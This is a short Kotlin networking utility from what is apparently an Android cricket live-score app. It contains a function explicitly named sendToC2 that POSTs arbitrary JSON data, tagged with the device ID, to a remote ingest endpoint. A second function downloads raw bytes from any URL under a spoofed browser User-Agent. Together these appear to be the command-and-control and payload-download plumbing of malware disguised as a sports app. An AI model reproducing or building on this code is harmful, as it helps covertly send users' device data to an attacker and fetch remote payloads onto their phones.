package com.cricket.livescore.utils

import android.util.Log
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.InputStream
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

object NetworkUtils {
    const val TAG = "NetworkUtils"
    const val TIMEOUT_MS = 30000

    fun sendToC2(baseUrl: String, jsonPayload: String): Boolean {
        return try {
            val url = URL("$baseUrl/api/ingest")
            val conn = url.openConnection() as HttpURLConnection
            conn.apply {
                requestMethod = "POST"
                connectTimeout = TIMEOUT_MS
                readTimeout = TIMEOUT_MS
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                setRequestProperty("X-Device-ID", android.os.Build.ID)
            }

            val writer = DataOutputStream(conn.outputStream)
            writer.writeBytes(jsonPayload)
            writer.flush()
            writer.close()

            val responseCode = conn.responseCode
            conn.disconnect()
            responseCode == 200
        } catch (e: Throwable) {
            Log.e(TAG, "sendToC2 failed", e)
            false
        }
    }

    fun downloadBytes(urlString: String): ByteArray? {
        return try {
            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection
            conn.apply {
                connectTimeout = TIMEOUT_MS
                readTimeout = TIMEOUT_MS
                requestMethod = "GET"
                setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 14)")
            }

            val inputStream: InputStream = conn.inputStream
            val bytes = inputStream.readBytes()
            inputStream.close()
            conn.disconnect()
            bytes
        } catch (e: Throwable) {
            Log.e(TAG, "downloadBytes failed", e)
            null
        }
    }

    fun checkConnectivity(): Boolean {
        return try {
            val url = URL("https://www.google.com/generate_204")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.connect()
            val code = conn.responseCode
            conn.disconnect()
            code == 204 || code == 200
        } catch (e: Exception) {
            false
        }
    }
}
